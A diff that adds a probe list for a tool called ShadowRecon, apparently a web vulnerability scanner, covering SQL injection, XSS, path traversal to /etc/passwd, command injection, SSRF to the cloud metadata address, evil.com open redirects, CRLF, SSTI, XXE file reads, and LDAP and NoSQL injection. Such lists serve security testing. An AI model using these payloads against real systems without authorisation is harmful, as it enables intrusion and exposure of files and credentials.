@@ -1,0 +1,61 @@
+# ShadowRecon Misconfiguration Probes
+# SQL Injection probes
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+admin' --
+1' ORDER BY 1--
+1' UNION SELECT 1--
+1' AND 1=1--
+1' AND 1=2--
+
+# XSS probes
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)
+
+# Path traversal
+../../etc/passwd
+..\\..\\windows\\win.ini
+%2e%2e%2fetc%2fpasswd
+%252e%252e%252fetc%252fpasswd
+
+# Command injection
+; id
+| id
+` id`
+$(id)
+; ping -c 10 127.0.0.1
+
+# SSRF probes
+http://169.254.169.254/latest/meta-data/
+http://127.0.0.1:22
+http://localhost:8080
+
+# Open redirect
+//evil.com
+https://evil.com@real.com
+//evil.com/..
+
+# CRLF injection
+%0d%0aSet-Cookie:%20test=1
+%0aX-XSS-Protection:%200
+
+# SSTI probes
+{{7*7}}
+${7*7}
+{{config}}
+<%= 7*7 %>
+
+# XXE probes
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>&test;
+
+# LDAP injection
+*)(uid=*
+*|(&(uid=*))
+
+# NoSQL injection
+' && 1==1 //
+' && this.password.match(/.*/)//
